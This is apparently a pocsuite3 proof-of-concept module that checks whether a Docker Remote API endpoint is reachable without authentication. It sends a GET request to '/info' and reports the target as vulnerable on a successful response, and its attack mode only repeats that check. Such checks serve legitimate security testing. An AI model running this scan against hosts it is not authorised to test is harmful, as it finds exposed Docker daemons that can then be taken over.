#!/usr/bin/env python
#_*_ encoding: utf-8 _*_

from pocsuite3.api import register_poc
from pocsuite3.api import Output
from pocsuite3.api import POCBase
from pocsuite3.api import requests
from pocsuite3.api import logger

class Docker(POCBase):
    vulID = '89696'
    version = '1.0'
    author = ['big04dream']
    vulDate = '2015-10-30'
    createDate = '2019-10-17'
    updateDate = '2019-10-17'
    references = ['https://www.seebug.org/vuldb/ssvid-89696']
    name = 'Docker Remote API Unauthrized Access'
    appPowerLink = 'https://www.docker.com/'
    appName = 'Docker'
    appVersion = 'all'
    vulType = 'Unauthrized Access'
    desc = '''
    Docker Remote API Unauthrized Access
    '''

    def _verify(self):
        result = {}
        try:
            url = self.url + "/info"
            res = requests.get(url)
            if res.status_code == 200 and res.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Payload'] = url
        except Exception as e:
            logger.info(e)
        return self.parse_ouput(result)

    def _attack(self):
        return self._verify()

    def parse_ouput(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not docker vulnerability')
        return output

register_poc(Docker)